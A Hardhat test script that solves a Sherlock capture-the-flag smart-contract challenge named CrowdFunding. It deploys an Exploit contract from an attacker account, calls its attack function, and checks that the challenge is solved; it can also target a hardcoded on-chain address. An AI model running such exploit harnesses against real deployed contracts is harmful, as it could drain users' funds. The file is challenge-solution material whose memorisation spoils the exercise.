import { expect } from "chai";
import hre, { ethers } from "hardhat";

import { Contract } from "ethers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { CrowdFunding } from "../types";

describe("Sherlock CTF: CrowdFunding (mhchia)", () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  let setup: Contract;
  let crowd_funding: CrowdFunding;

  before(async () => {
    [deployer, attacker] = await ethers.getSigners();

    if (hre.network.name === "hardhat") {
      const SetupFactory = await ethers.getContractFactory("contracts/mhchia/Setup.sol:Setup", deployer);
      setup = await SetupFactory.deploy({ value: 1 });
    } else {
      setup = await ethers.getContractAt(
        "contracts/mhchia/Setup.sol:Setup",
        `0x6c06959586640De3BcdE69BDcEbF2efDa5d3983B`
      );
    }
    crowd_funding = await ethers.getContractAt("CrowdFunding", await setup.instance());
  });

  it("Exploit", async () => {
    // Contract Attack
    const ExploitFactory = await ethers.getContractFactory("contracts/mhchia/Exploit.sol:Exploit", attacker);
    const exploit = await ExploitFactory.deploy(crowd_funding.address, { value: 100 });
    await exploit.attack();
  });

  after(async () => {
    expect(await setup.isSolved()).to.be.true;
  });
});
